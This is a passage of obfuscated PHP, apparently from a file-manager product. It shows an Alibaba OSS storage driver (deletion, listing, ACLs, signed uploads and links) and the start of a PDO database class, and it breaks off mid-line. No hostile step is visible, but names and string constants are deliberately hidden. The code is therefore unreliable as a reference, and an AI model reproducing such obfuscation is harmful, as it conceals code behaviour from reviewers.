$÷ççéİÎ =& $_SERVER[¹Û¹Æ€]; if (!$this->exist($‘¾¯‰ÁÙ)) { return !0; } $this->listItemCache = !1; $‰òË = $this->fileList($‘¾¯‰ÁÙ); $this->listItemCache = !0; $Èò Ç» = trim($‘¾¯‰ÁÙ, $÷ççéİÎ[18]) . $÷ççéİÎ[18]; if (!empty($‘¾¯‰ÁÙ) && $‘¾¯‰ÁÙ !== $÷ççéİÎ[207] && !in_array($Èò Ç», $‰òË[$÷ççéİÎ[92]])) { $‰òË[$÷ççéİÎ[92]][] = $Èò Ç»; } $åú˜·Õô = $this->delByBatch($‰òË[$÷ççéİÎ[93]]); if (!$åú˜·Õô) { return !1; } $åú˜·Õô = $this->delByBatch($‰òË[$÷ççéİÎ[92]]); if (!$åú˜·Õô) { return !1; } return $this->delFile($Èò Ç»); } private function delByBatch($È“¤ó±û) { foreach (array_chunk($È“¤ó±û, 1000) as $âÙşØ©ú) { try { $this->client->deleteObjects($this->bucket, $âÙşØ©ú); } catch (OSS\Core\OssException $ÉØ¹áƒÆ) { return !1; } } return !0; } public function rename($úÙ˜…Ö, $íûœŠ®Ì) { return $this->renameObject($úÙ˜…Ö, $íûœŠ®Ì); } private function fileInfo($»îÇ§ª, $É¦ıÕ = false, $¸ïì×éş = array()) { $òÅî½æŠ =& $_SERVER[¹Û¹Æ€]; $¡ÊÈ ‡Ñ = array($òÅî½æŠ[42] => $this->pathThis($»îÇ§ª), $òÅî½æŠ[94] => $this->getPathOuter($»îÇ§ª), $òÅî½æŠ[43] => $òÅî½æŠ[209], $òÅî½æŠ[86] => isset($¸ïì×éş[$òÅî½æŠ[86]]) ? $¸ïì×éş[$òÅî½æŠ[86]] : 0, $òÅî½æŠ[184] => $this->ext($»îÇ§ª)); if ($É¦ıÕ) { return $¡ÊÈ ‡Ñ; } $¡ÊÈ ‡Ñ[$òÅî½æŠ[210]] = $¡ÊÈ ‡Ñ[$òÅî½æŠ[95]] = 0; $¡ÊÈ ‡Ñ[$òÅî½æŠ[211]] = $¡ÊÈ ‡Ñ[$òÅî½æŠ[212]] = !0; if (empty($¸ïì×éş)) { $·çïé = $this->objectMeta($»îÇ§ª); if (!$·çïé) { return $¡ÊÈ ‡Ñ; } $¸ïì×éş = array($òÅî½æŠ[95] => strtotime($·çïé[$òÅî½æŠ[1404]]), $òÅî½æŠ[86] => $·çïé[$òÅî½æŠ[1403]] + 0); } if (isset($¸ïì×éş[$òÅî½æŠ[86]])) { $¡ÊÈ ‡Ñ[$òÅî½æŠ[86]] = $¸ïì×éş[$òÅî½æŠ[86]]; } if (isset($¸ïì×éş[$òÅî½æŠ[95]])) { $¡ÊÈ ‡Ñ[$òÅî½æŠ[95]] = $¸ïì×éş[$òÅî½æŠ[95]]; } if (isset($¸ïì×éş[$òÅî½æŠ[213]]) && !trim($¡ÊÈ ‡Ñ[$òÅî½æŠ[95]])) { $¡ÊÈ ‡Ñ[$òÅî½æŠ[95]] = $¸ïì×éş[$òÅî½æŠ[213]]; } return $¡ÊÈ ‡Ñ; } private function folderInfo($°êÑ€ŸÕ, $ÍóÒÚ†œ = false, $ÃÕÆ˜¯ß = array()) { $Ç“ßè‡· =& $_SERVER[¹Û¹Æ€]; $ÃÈáé = array($Ç“ßè‡·[42] => $this->pathThis($°êÑ€ŸÕ), $Ç“ßè‡·[94] => $this->getPathOuter($Ç“ßè‡·[18] . $°êÑ€ŸÕ), $Ç“ßè‡·[43] => $Ç“ßè‡·[85]); if ($ÍóÒÚ†œ) { return $ÃÈáé; } $ÃÈáé[$Ç“ßè‡·[210]] = $ÃÈáé[$Ç“ßè‡·[95]] = 0; $ÃÈáé[$Ç“ßè‡·[211]] = $ÃÈáé[$Ç“ßè‡·[212]] = !0; if (empty($ÃÕÆ˜¯ß)) { $°êÑ€ŸÕ = rtrim($°êÑ€ŸÕ, $Ç“ßè‡·[18]) . $Ç“ßè‡·[18]; $˜ûûë = $this->objectMeta($°êÑ€ŸÕ); if (!$˜ûûë) { return $ÃÈáé; } $ÃÕÆ˜¯ß = array($Ç“ßè‡·[210] => $˜ûûë[$Ç“ßè‡·[520]][$Ç“ßè‡·[1411]], $Ç“ßè‡·[95] => strtotime($˜ûûë[$Ç“ßè‡·[1404]])); } if (isset($ÃÕÆ˜¯ß[$Ç“ßè‡·[95]])) { $ÃÈáé[$Ç“ßè‡·[95]] = $ÃÕÆ˜¯ß[$Ç“ßè‡·[95]]; } if (isset($ÃÕÆ˜¯ß[$Ç“ßè‡·[210]])) { $ÃÈáé[$Ç“ßè‡·[210]] = $ÃÕÆ˜¯ß[$Ç“ßè‡·[210]]; } return $ÃÈáé; } public function listPath($ÉŞ»ÛÕ, $§Ò„¬ò = false) { $Î§òÚ‹Å =& $_SERVER[¹Û¹Æ€]; $¾Á¬şÔ× = $this->fileList($ÉŞ»ÛÕ, $Î§òÚ‹Å[18], !0); foreach ($¾Á¬şÔ×[$Î§òÚ‹Å[92]] as $Èæ»‚ğæ => $û®«Ãì) { $¾Á¬şÔ×[$Î§òÚ‹Å[92]][$Èæ»‚ğæ] = $this->folderInfo($û®«Ãì, $§Ò„¬ò, $û®«Ãì); } foreach ($¾Á¬şÔ×[$Î§òÚ‹Å[93]] as $Èæ»‚ğæ => $û®«Ãì) { $¾Á¬şÔ×[$Î§òÚ‹Å[93]][$Èæ»‚ğæ] = $this->fileInfo($û®«Ãì[$Î§òÚ‹Å[42]], $§Ò„¬ò, $û®«Ãì); } return $¾Á¬şÔ×; } protected function infoChildren($¡İ›‚º, &$ìû†Ü÷Ö) { $¡äÍÍĞë =& $_SERVER[¹Û¹Æ€]; $òÖ˜‚ç» = $this->fileList($¡İ›‚º, $¡äÍÍĞë[22], !0); $ìû†Ü÷Ö[$¡äÍÍĞë[88]] += count($òÖ˜‚ç»[$¡äÍÍĞë[92]]); $ìû†Ü÷Ö[$¡äÍÍĞë[87]] += count($òÖ˜‚ç»[$¡äÍÍĞë[93]]); foreach ($òÖ˜‚ç»[$¡äÍÍĞë[93]] as $©ÛÈöı€) { if (!$©ÛÈöı€ || !$©ÛÈöı€[$¡äÍÍĞë[86]]) { continue; } $ìû†Ü÷Ö[$¡äÍÍĞë[86]] += $©ÛÈöı€[$¡äÍÍĞë[86]]; } } public function has($èÂÖ™ø, $ğÄğ°Š¬ = false, $¼Òø»‚Ç = true) { $Ù†—ò„¡ =& $_SERVER[¹Û¹Æ€]; $èÂÖ™ø = trim($èÂÖ™ø, $Ù†—ò„¡[18]); $èíÑŞ† = empty($èÂÖ™ø) && $èÂÖ™ø !== $Ù†—ò„¡[207] ? $Ù†—ò„¡[22] : $èÂÖ™ø . $Ù†—ò„¡[18]; $ªÌ­ä† = $Ù†—ò„¡[22]; $Úà»¼¨Ü = 500; $Ôáúù§— = $ûÎÁïÄÖ = 0; while (!0) { check_abort(); $áºÃ·÷Ş = array($Ù†—ò„¡[1399] => $Ù†—ò„¡[18], $Ù†—ò„¡[1400] => $èíÑŞ†, $Ù†—ò„¡[1401] => $Úà»¼¨Ü, $Ù†—ò„¡[1402] => $ªÌ­ä†); try { $›…®·ú = $this->client->listObjects($this->bucket, $áºÃ·÷Ş); } catch (OSS\Core\OssException $¬ı¦ÛŠü) { break; } $ªÌ­ä† = $›…®·ú->getNextMarker(); $‰‰¬ÆÊ = $›…®·ú->getObjectList(); $ê»Ö“Æ¿ = $›…®·ú->getPrefixList(); if ($ğÄğ°Š¬) { if (count($‰‰¬ÆÊ) > 1 || count($‰‰¬ÆÊ) == 1 && $‰‰¬ÆÊ[0]->getKey() != $èíÑŞ†) { $Ôáúù§— += count($‰‰¬ÆÊ) - 1; } if (!empty($ê»Ö“Æ¿)) { $ûÎÁïÄÖ += count($ê»Ö“Æ¿); } if ($ªÌ­ä† === $Ù†—ò„¡[22]) { break; } continue; } if ($¼Òø»‚Ç) { if (!empty($‰‰¬ÆÊ)) { if (count($‰‰¬ÆÊ) > 1 || $‰‰¬ÆÊ[0]->getKey() != $èíÑŞ†) { return !0; } } } else { if (!empty($ê»Ö“Æ¿)) { return !0; } } if ($ªÌ­ä† === $Ù†—ò„¡[22]) { break; } } if ($ğÄğ°Š¬) { return array($Ù†—ò„¡[217] => $Ôáúù§—, $Ù†—ò„¡[218] => $ûÎÁïÄÖ); } return !1; } public function listAll($É¡ñºùÙ) { $È—ÛÁøÜ =& $_SERVER[¹Û¹Æ€]; $ìœĞÖ´× = $this->fileList($É¡ñºùÙ, $È—ÛÁøÜ[22], !0); $å‘‡ıÅá = array(); foreach ($ìœĞÖ´×[$È—ÛÁøÜ[93]] as $§î™ö‡Ğ) { $å‘‡ıÅá[$§î™ö‡Ğ[$È—ÛÁøÜ[42]]] = $§î™ö‡Ğ[$È—ÛÁøÜ[86]]; } foreach ($ìœĞÖ´×[$È—ÛÁøÜ[92]] as $§î™ö‡Ğ) { if (is_string($§î™ö‡Ğ)) { $å‘‡ıÅá[$§î™ö‡Ğ] = 0; } } return $this->listAllFiles($É¡ñºùÙ, array_keys($å‘‡ıÅá), $å‘‡ıÅá); } public function canRead($çßƒÎ¾î) { $³¥ÇÓ¶ª =& $_SERVER[¹Û¹Æ€]; $Ş÷»ßƒ¥ = $this->pathAcl($çßƒÎ¾î); return $Ş÷»ßƒ¥ == $³¥ÇÓ¶ª[1412] || $Ş÷»ßƒ¥ == $³¥ÇÓ¶ª[565] ? !0 : !1; } public function canWrite($ˆÙ®÷©é) { $î“ôêã× = $this->pathAcl($ˆÙ®÷©é); return $î“ôêã× == $_SERVER[¹Û¹Æ€][565] ? !0 : !1; } public function pathAcl($Æ©ˆªºÜ) { $ëÚœš¯¦ =& $_SERVER[¹Û¹Æ€]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ğåÃıÆ” = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Æ©ˆªºÜ)); } catch (OSS\Core\OssException $Ş´Ü­šÊ) { return !1; } $±Ö‚ÖËè = $ğåÃıÆ” == $ëÚœš¯¦[47] ? $this->bucketAcl : $ğåÃıÆ”; if ($±Ö‚ÖËè == $ëÚœš¯¦[1413]) { return $ëÚœš¯¦[1412]; } if ($±Ö‚ÖËè == $ëÚœš¯¦[1414]) { return $ëÚœš¯¦[565]; } return $±Ö‚ÖËè; } private function chmodPath($¡£¶¸Šú, $çÁ´‹ñ = '') { $¤Áªø¥ =& $_SERVER[¹Û¹Æ€]; $Ÿ÷®ªºÔ = empty($çÁ´‹ñ) ? $¤Áªø¥[1414] : $çÁ´‹ñ; $Û¨öëû‚ = array($¤Áªø¥[47], $¤Áªø¥[208], $¤Áªø¥[1413], $¤Áªø¥[1414]); if (!in_array($Ÿ÷®ªºÔ, $Û¨öëû‚)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¡£¶¸Šú), $Ÿ÷®ªºÔ); } catch (OSS\Core\OssException $• ÁÛÉ) { return !1; } return !0; } public function getContent($µôÙ­îë) { return $this->fileSubstr($µôÙ­îë, -1); } public function setContent($Ø†Ä±ˆÔ, $ƒæŒÃí¶ = '') { $Å¼Á…îá =& $_SERVER[¹Û¹Æ€]; try { $ûëíî = $this->trafficLimit($Å¼Á…îá[1415]); $²®Ÿ‘Æ = $this->client->putObject($this->bucket, $this->pathEncode($Ø†Ä±ˆÔ), $ƒæŒÃí¶, $ûëíî); } catch (OSS\Core\OssException $ëÛşóõé) { return !1; } $Ö¹ÃúÒŒ = array($Å¼Á…îá[1405] => trim($²®Ÿ‘Æ[$Å¼Á…îá[1416]], $Å¼Á…îá[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ø†Ä±ˆÔ))); $this->updateObjMeta($Ø†Ä±ˆÔ, $Ö¹ÃúÒŒ); return isset($²®Ÿ‘Æ[$Å¼Á…îá[1417]][$Å¼Á…îá[1364]]) ? !0 : !1; } private function updateObjMeta($Çôê Ê«, $“ÒŞá‚û) { $Çôê Ê« = $this->pathEncode($Çôê Ê«); try { $€Æşõ¶Ô = array(OSS\OssClient::OSS_HEADERS => $“ÒŞá‚û); $this->client->copyObject($this->bucket, $Çôê Ê«, $this->bucket, $Çôê Ê«, $€Æşõ¶Ô); } catch (OSS\Core\OssException $Ô§®›¸) { return !1; } return !0; } public function upload($ªĞ–¶”, $õ‰ÛŸ—, $±æº®‡¹ = false, $üëäæ½Ø = REPEAT_REPLACE) { $¡¦Ó«ñÍ =& $_SERVER[¹Û¹Æ€]; $ ‹õ± = trim($ªĞ–¶”, $¡¦Ó«ñÍ[18]); $ÉÅöÙ¤· = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¡¦Ó«ñÍ[1405] => @md5_file($õ‰ÛŸ—)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ªĞ–¶”))); $ÉÅöÙ¤· = $this->trafficLimit($¡¦Ó«ñÍ[1415], $ÉÅöÙ¤·); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ ‹õ±), $õ‰ÛŸ—, $ÉÅöÙ¤·); } catch (OSS\Core\OssException $À€ôûöØ) { return !1; } return $this->getPathOuter($ªĞ–¶”); } public function getHost() { $ãšş—» =& $_SERVER[¹Û¹Æ€]; $¦³Èî‰¡ = explode($ãšş—»[193], parent::getHost()); return $¦³Èî‰¡[0] . $ãšş—»[193] . $this->bucket . $ãšş—»[20] . $¦³Èî‰¡[1]; } public function uploadFormData($Å½¿¶œ¤, $èÚÔÕ§† = 3600) { $å­œ™§ =& $_SERVER[¹Û¹Æ€]; if (!($€¸İ‹î³ = $this->getHost())) { return !1; } $À¹“–—¶ = $èÚÔÕ§†; $Ü™ŞÏëÊ = date($å­œ™§[1418], time() + $À¹“–—¶); $ÉŸÛšÑ = new DateTime($Ü™ŞÏëÊ); $ØïÍèŒ› = $ÉŸÛšÑ->format(DateTime::ISO8601); $Ü‰–Ãã = strpos($ØïÍèŒ›, $å­œ™§[305]); $ØïÍèŒ› = substr($ØïÍèŒ›, 0, $Ü‰–Ãã) . $å­œ™§[1419]; $³Óø«„ = 1048576000 * 5; $ğ›‰Ğ§Å = $this->pathFather($Å½¿¶œ¤); $Ï¯º·Ÿ = array($å­œ™§[1318] => $ØïÍèŒ›, $å­œ™§[1319] => array(array($å­œ™§[1420], 0, $³Óø«„), array($å­œ™§[1322], $å­œ™§[1323], $ğ›‰Ğ§Å))); $à®Ìü¡€ = base64_encode(json_encode($Ï¯º·Ÿ)); $Ÿ‚”Ü«Ê = base64_encode(hash_hmac($å­œ™§[241], $à®Ìü¡€, $this->secret, !0)); $³†œßïÜ = array($å­œ™§[1328] => $à®Ìü¡€, $å­œ™§[1421] => $this->accessKey, $å­œ™§[1324] => $å­œ™§[1316], $å­œ™§[1422] => $Ÿ‚”Ü«Ê, $å­œ™§[191] => $€¸İ‹î³); $³†œßïÜ = $this->trafficLimit($å­œ™§[1415], $³†œßïÜ); return $³†œßïÜ; } public function multiUploadFormData($ºÕ’ÄØÂ, $ŞèÑˆ”™ = 3600) { $»ïÑÑ‚Â =& $_SERVER[¹Û¹Æ€]; if (!($Ó¥Ï±Ó– = $this->getHost())) { return !1; } $‰Ö™Ô¸á = $this->trafficLimit($»ïÑÑ‚Â[1415]); $ßÁØÏŞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ºÕ’ÄØÂ), $‰Ö™Ô¸á); return array($»ïÑÑ‚Â[233] => $ßÁØÏŞ, $»ïÑÑ‚Â[191] => $Ó¥Ï±Ó– . $»ïÑÑ‚Â[18] . $this->pathEncode($ºÕ’ÄØÂ), $»ïÑÑ‚Â[234] => gmdate($»ïÑÑ‚Â[1423]), $»ïÑÑ‚Â[104] => $ºÕ’ÄØÂ); } public function multiUploadAuthData($¶¡ùãÆƒ, $Ù¶¹ìàÁ = array()) { $Üİ€•—’ =& $_SERVER[¹Û¹Æ€]; $Ü­ªë³ï = isset($Ù¶¹ìàÁ[$Üİ€•—’[234]]) ? $Ù¶¹ìàÁ[$Üİ€•—’[234]] : gmdate($Üİ€•—’[1423]); $ó™ğø¤ = isset($Ù¶¹ìàÁ[$Üİ€•—’[184]]) ? $Ù¶¹ìàÁ[$Üİ€•—’[184]] : $Üİ€•—’[22]; $ãÎ­£’ = $¶¡ùãÆƒ; if (isset($Ù¶¹ìàÁ[$Üİ€•—’[104]])) { $ãÎ­£’ = $Ù¶¹ìàÁ[$Üİ€•—’[104]]; unset($Ù¶¹ìàÁ[$Üİ€•—’[104]]); } if (isset($Ù¶¹ìàÁ[$Üİ€•—’[235]])) { $Ù¶¹ìàÁ[$Üİ€•—’[234]] = $Ü­ªë³ï; return $this->listUploadParts($ãÎ­£’, $Ù¶¹ìàÁ); } $ †µ€ = array($Üİ€•—’[236], $Üİ€•—’[22], $Üİ€•—’[130], $Ü­ªë³ï, "\x78\x2d\157\x73\x73\55\144\x61\x74\145\x3a{$Ü­ªë³ï}", $Üİ€•—’[18] . $this->bucket . $Üİ€•—’[18] . $ãÎ­£’ . $ó™ğø¤); if (strpos($ó™ğø¤, $Üİ€•—’[237]) === 0) { $ †µ€[0] = $Üİ€•—’[238]; if ($¡ø»¢ƒ¬ = $this->trafficLimit($Üİ€•—’[1415])) { $ãÎ­£’ = $Üİ€•—’[1424]; array_splice($ †µ€, 5, 0, $ãÎ­£’ . $Üİ€•—’[4] . $¡ø»¢ƒ¬[$ãÎ­£’]); } } if (isset($Ù¶¹ìàÁ[$Üİ€•—’[239]]) && $Ù¶¹ìàÁ[$Üİ€•—’[239]] == $Üİ€•—’[240]) { $ †µ€[0] = $Üİ€•—’[240]; } if (!empty($Ù¶¹ìàÁ[$Üİ€•—’[1425]])) { $´×ËÍ¶ = array_merge(array($ †µ€[4]), $Ù¶¹ìàÁ[$Üİ€•—’[1425]]); sort($´×ËÍ¶); $ †µ€[4] = implode($Üİ€•—’[12], $´×ËÍ¶); } $¿ñî¨·ß = implode($Üİ€•—’[12], $ †µ€); $œ¹é²ş = base64_encode(hash_hmac($Üİ€•—’[241], $¿ñî¨·ß, $this->secret, !0)); $†¿Êí Ù = $Üİ€•—’[1389] . $this->accessKey . $Üİ€•—’[4] . $œ¹é²ş; if (strpos($ó™ğø¤, $Üİ€•—’[237]) === 0) { $†¿Êí Ù = array($Üİ€•—’[243] => $†¿Êí Ù, $Üİ€•—’[234] => $Ü­ªë³ï); if ($¡ø»¢ƒ¬) { $†¿Êí Ù = array_merge($†¿Êí Ù, $¡ø»¢ƒ¬); } } return $†¿Êí Ù; } public function listUploadParts($—‘Ï, $çŒ›ø£¿) { $‰ß·Í› =& $_SERVER[¹Û¹Æ€]; $Æ¯Ç°Ï = parse_url_query($çŒ›ø£¿[$‰ß·Í›[184]]); $¢¦‰‡’Ë = $this->client->listParts($this->bucket, $this->pathEncode($—‘Ï), $Æ¯Ç°Ï[$‰ß·Í›[233]]); $òĞ¾¦á¥ = $¢¦‰‡’Ë->getListPart(); $»ñ³ãÅ = array(); foreach ($òĞ¾¦á¥ as $’ §÷¿) { $»ñ³ãÅ[] = array($‰ß·Í›[1409] => $’ §÷¿->getPartNumber(), $‰ß·Í›[1410] => trim($’ §÷¿->getETag(), $‰ß·Í›[128])); } unset($çŒ›ø£¿[$‰ß·Í›[235]], $çŒ›ø£¿[$‰ß·Í›[239]]); $Ë¶ËÖİÏ = $this->multiUploadAuthData($—‘Ï, $çŒ›ø£¿); if (empty($Ë¶ËÖİÏ)) { return !1; } return array($‰ß·Í›[243] => $Ë¶ËÖİÏ, $‰ß·Í›[234] => $çŒ›ø£¿[$‰ß·Í›[234]], $‰ß·Í›[245] => $»ñ³ãÅ); } public function download($‹­…–Ã”, $ÌØò¡Şß) { if ($this->isFolder($‹­…–Ã”)) { return !1; } try { $×ìÉÙÆ” = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ÌØò¡Şß); $×ìÉÙÆ” = $this->trafficLimit($_SERVER[¹Û¹Æ€][119], $×ìÉÙÆ”); $this->client->getObject($this->bucket, $this->pathEncode($‹­…–Ã”), $×ìÉÙÆ”); } catch (OSS\Core\OssException $îöÓíÕÏ) { return !1; } return $ÌØò¡Şß; } public function fileSubstr($²€£¶¥±, $É¬ÁÂ× = 0, $«ğ“ƒ = false) { if ($É¬ÁÂ× === -1) { $¬¾Ö÷ÉÆ = array(); } else { if ($«ğ“ƒ === !1) { $—©ßÊÄ = $this->size($²€£¶¥±); } else { $—©ßÊÄ = $É¬ÁÂ× + $«ğ“ƒ - 1; } $¬¾Ö÷ÉÆ = array(OSS\OssClient::OSS_RANGE => "{$É¬ÁÂ×}\x2d{$—©ßÊÄ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($²€£¶¥±), $¬¾Ö÷ÉÆ); } catch (OSS\Core\OssException $ŞñÔíú) { think_exception($ŞñÔíú->getMessage()); return !1; } } private function trafficLimit($™·ˆĞ“å, $†ßşÜØ² = array()) { $Ğ•ÁêÀı =& $_SERVER[¹Û¹Æ€]; if ($™·ˆĞ“å == $Ğ•ÁêÀı[1415] && $this->isUploadServer() || $™·ˆĞ“å == $Ğ•ÁêÀı[119] && $this->isFileOutServer()) { return $†ßşÜØ²; } $¶€ü¬öÙ = floatval($GLOBALS[$Ğ•ÁêÀı[16]][$Ğ•ÁêÀı[99]][$Ğ•ÁêÀı[117]][$™·ˆĞ“å]) * 1024 * 1024 * 8; if (!$¶€ü¬öÙ) { return $†ßşÜØ²; } $¶€ü¬öÙ = $¶€ü¬öÙ < 819200 ? 819200 : ($¶€ü¬öÙ > 838860800 ? 838860800 : $¶€ü¬öÙ); $†ßşÜØ²[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¶€ü¬öÙ); return $†ßşÜØ²; } public function link($Ï¹‰»ı, $ê¬œ›íı = array()) { $òÎãÓºŠ =& $_SERVER[¹Û¹Æ€]; if (!$this->exist($Ï¹‰»ı) || $this->isFolder($Ï¹‰»ı)) { return !1; } try { $ê¬œ›íı = $this->trafficLimit($òÎãÓºŠ[119], $ê¬œ›íı); $£à¼áœ = $this->client->signUrl($this->bucket, $this->pathEncode($Ï¹‰»ı), 3600 * 12, $òÎãÓºŠ[240], $ê¬œ›íı); return $this->getCdnLink($£à¼áœ); } catch (OSS\Core\OssException $ÇçÏÍİ¢) { return !1; } } public function fileOut($¼ıÛ’Ã¨, $ä—•ã® = false, $ÎÒ„¨¸ = false, $§•ìÊéş = '') { $áÂâ©é =& $_SERVER[¹Û¹Æ€]; if ($this->isFileOutServer()) { return $this->fileOutServer($¼ıÛ’Ã¨, $ä—•ã®, $ÎÒ„¨¸, $§•ìÊéş); } if (!$ÎÒ„¨¸) { $ÎÒ„¨¸ = $this->pathThis($¼ıÛ’Ã¨); } $ÎÒ„¨¸ = rawurlencode($ÎÒ„¨¸); $Ç—‡åÅî = get_file_mime(get_path_ext($ÎÒ„¨¸)); if ($Ç—‡åÅî == $áÂâ©é[227]) { return parent::fileOut($¼ıÛ’Ã¨, $ä—•ã®, $ÎÒ„¨¸, $§•ìÊéş); } $ä—•ã® = $ä—•ã® ? $áÂâ©é[1426] : $áÂâ©é[1427]; $ÛÒ²¨§ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $áÂâ©é[1428] . rawurlencode("{$ä—•ã®}\x3b\146\x69\154\x65\x6e\141\155\145\75{$ÎÒ„¨¸}")); $ÛÒ²¨§ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $áÂâ©é[1429] . rawurlencode($Ç—‡åÅî); $ÍÓ¹À = $this->link($¼ıÛ’Ã¨, $ÛÒ²¨§ê); $this->fileOutLink($ÍÓ¹À); } public function fileOutServer($”ñç—Ş, $ËğÕ˜Ò° = false, $¢—Ğë• = false, $–³©ú™à = '') { parent::fileOut($”ñç—Ş, $ËğÕ˜Ò°, $¢—Ğë•, $–³©ú™à); } public function fileOutImage($àó¯Æ»§, $ƒİÔ«÷å = 250) { $°¶ÄñÁ± = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹Û¹Æ€][1430] . $ƒİÔ«÷å); $õ¯ãÛîô = $this->link($àó¯Æ»§, $°¶ÄñÁ±); $this->fileOutLink($õ¯ãÛîô); } public function fileOutImageServer($Í¤°¨øß, $ñ“¹–·ø = 250) { parent::fileOutImage($Í¤°¨øß, $ñ“¹–·ø); } public function fileOutLink($—Ò’ŒÒ¢) { $•«ŞÙââ =& $_SERVER[¹Û¹Æ€]; if (!$this->isCdnHost() && substr($—Ò’ŒÒ¢, 0, 7) == $•«ŞÙââ[1331]) { $—Ò’ŒÒ¢ = $•«ŞÙââ[1332] . substr($—Ò’ŒÒ¢, 7); } header($•«ŞÙââ[171] . $—Ò’ŒÒ¢); die; } public function hashMd5($ö³Ô¤», $ßÄÎœİó = '') { $ĞæÆº‡¶ =& $_SERVER[¹Û¹Æ€]; $ùİË¤Ôú = $this->_objectMeta($ö³Ô¤»); if (!$ùİË¤Ôú) { return $ĞæÆº‡¶[22]; } if (!isset($ùİË¤Ôú[$ĞæÆº‡¶[1405]]) && !empty($ßÄÎœİó)) { $Ì¥›âÀİ = $this->updateObjMeta($ö³Ô¤», array($ĞæÆº‡¶[1405] => $ßÄÎœİó)); $ùİË¤Ôú[$ĞæÆº‡¶[1405]] = $Ì¥›âÀİ ? $ßÄÎœİó : $ĞæÆº‡¶[22]; } return isset($ùİË¤Ôú[$ĞæÆº‡¶[1405]]) ? strtolower($ùİË¤Ôú[$ĞæÆº‡¶[1405]]) : $ĞæÆº‡¶[22]; } public function size($é÷õæÚ¤) { $–½üÍ• = $this->objectMeta($é÷õæÚ¤); return $–½üÍ• ? $–½üÍ•[$_SERVER[¹Û¹Æ€][86]] : 0; } public function info($„Ûµ‹Ä„) { if ($this->isFolder($„Ûµ‹Ä„)) { return $this->folderInfo($„Ûµ‹Ä„); } else { if ($this->isFile($„Ûµ‹Ä„)) { return $this->fileInfo($„Ûµ‹Ä„); } } return !1; } public function exist($”€¬Äèû) { return $this->isFile($”€¬Äèû) || $this->isFolder($”€¬Äèû); } public function isFile($¸–Ÿö’) { return !$this->isFolder($¸–Ÿö’) && $this->objectMeta($¸–Ÿö’); } public function isFolder($ÎÓùıìˆ) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][175], $ÎÓùıìˆ); } protected function objectMeta($ÀùÍ÷¢•) { return $this->cacheMethod($_SERVER[¹Û¹Æ€][177], $ÀùÍ÷¢•); } protected function _objectMeta($ûÍÙ€º¾) { $¹¤Ü£ıÚ =& $_SERVER[¹Û¹Æ€]; try { $«óŒ½õ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ûÍÙ€º¾)); } catch (OSS\Core\OssException $ÍŒŸè) { $«óŒ½õ = !1; } if ($«óŒ½õ) { $«óŒ½õ[$¹¤Ü£ıÚ[86]] = intval($«óŒ½õ[$¹¤Ü£ıÚ[1403]]); } return $«óŒ½õ; } protected function _isFolder($´ë³ò¹) { $ûÙ«£˜ =& $_SERVER[¹Û¹Æ€]; if ($´ë³ò¹ == $ûÙ«£˜[22] || $´ë³ò¹ == $ûÙ«£˜[18]) { return !0; } $€ö¿ëë‘ = array($ûÙ«£˜[1399] => $ûÙ«£˜[18], $ûÙ«£˜[1400] => rtrim($´ë³ò¹, $ûÙ«£˜[18]) . $ûÙ«£˜[18], $ûÙ«£˜[1401] => 1, $ûÙ«£˜[1402] => $ûÙ«£˜[22]); $°â ¼î¢ = $this->client->listObjects($this->bucket, $€ö¿ëë‘); if ($°â ¼î¢->getObjectList() || $°â ¼î¢->getPrefixList()) { return !0; } return !1; } } goto e•áº‹ÆÑ”; DœÂ‰Œƒš: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ñ™•Åõˆ = '') { $¶èÎ²´– =& $_SERVER[¹Û¹Æ€]; if (!class_exists($¶èÎ²´–[911])) { think_exception(think_lang($¶èÎ²´–[24]) . $¶èÎ²´–[912]); } if (!empty($Ñ™•Åõˆ)) { $this->config = $Ñ™•Åõˆ; if (empty($this->config[$¶èÎ²´–[27]])) { $this->config[$¶èÎ²´–[27]] = array(); } } } public function connect($ª„Š¿†ú = '', $€¯æİ‡µ = 0) { $ŞÕêÛ§ğ =& $_SERVER[¹Û¹Æ€]; if (!isset($this->linkID[$€¯æİ‡µ])) { if (empty($ª„Š¿†ú)) { $ª„Š¿†ú = $this->config; } $ó¸ë”¡ = !empty($ª„Š¿†ú[$ŞÕêÛ§ğ[27]][$ŞÕêÛ§ğ[28]]) ? $ª„Š¿†ú[$ŞÕêÛ§ğ[27]][$ŞÕêÛ§ğ[28]] : $this->pconnect; if ($ó¸ë”¡) { $ª„Š¿†ú[$ŞÕêÛ§ğ[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$€¯æİ‡µ] = new PDO($ª„Š¿†ú[$ŞÕêÛ§ğ[913]], $ª„Š¿†ú[$ŞÕêÛ§ğ[885]], $ª„Š¿†ú[$ŞÕêÛ§ğ[886]], $ª„Š¿†ú[$ŞÕêÛ§ğ[27]]); } catch (PDOException $ ¿ó©ïÀ) { think_exception($ ¿ó©ïÀ->getMessage()); } $this->dbType = $this->_getDsnType($ª„Š¿†ú[$ŞÕêÛ§ğ[913]]); if (in_array($this->dbType, array($ŞÕêÛ§ğ[914], $ŞÕêÛ§ğ[915], $ŞÕêÛ§ğ[916], $ŞÕêÛ§ğ[917]))) { think_exception($ŞÕêÛ§ğ[918] . $this->dbType . $ŞÕêÛ§ğ[919] . $this->dbType . $ŞÕêÛ§ğ[920]); } if (!$this->linkID[$€¯æİ‡µ]) { think_exception($ŞÕêÛ§ğ[921]); } try { $this->linkID[$€¯æİ‡µ]->exec($ŞÕêÛ§ğ[922] . 